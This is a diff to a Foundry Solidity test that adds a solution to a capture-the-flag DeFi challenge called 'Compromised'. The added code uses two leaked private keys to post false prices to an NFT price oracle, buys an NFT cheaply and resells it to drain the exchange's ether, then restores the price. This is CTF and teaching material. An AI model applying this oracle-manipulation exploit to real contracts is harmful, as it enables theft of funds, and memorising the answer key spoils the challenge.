@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -75,7 +74,32 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // Derive the addresses from obtained private keys
+        address[] memory trustedSources = new address[](2);
+        trustedSources[0] = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        trustedSources[1] = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+        // Manipluate the price of the NFT to 0.1 ether to buy NFT
+        _manipulatePrice(trustedSources, 0.1 ether);
+
+        // Buy NFT for 0.1 ether
+        vm.prank(player);
+        exchange.buyOne{value: 0.1 ether}();
+
+        // Set to 999.1 ether to sell NFT and steal all the funds from Exchange
+        _manipulatePrice(trustedSources, INITIAL_NFT_PRICE + PLAYER_INITIAL_ETH_BALANCE);
+
+        // Sell NFT and send the funds to the recovery account
+        vm.startPrank(player);
+        nft.approve(address(exchange), 0);
+        exchange.sellOne(0);
+
+        (bool success,) = address(recovery).call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success, "Transfer failed");
+        vm.stopPrank();
+
+        // Set the price to its initial value
+        _manipulatePrice(trustedSources, INITIAL_NFT_PRICE);
     }
 
     /**
@@ -93,5 +117,15 @@ contract CompromisedChallenge is Test {
 
         // NFT price didn't change
         assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
+    }
+
+    /**
+     * UTILITY FUNCTIONS FOR SOLUTION
+     */
+    function _manipulatePrice(address[] memory trustedSources, uint256 price) private {
+        for (uint256 i = 0; i < trustedSources.length; i++) {
+            vm.prank(sources[i]);
+            oracle.postPrice("DVNFT", price);
+        }
     }
 }
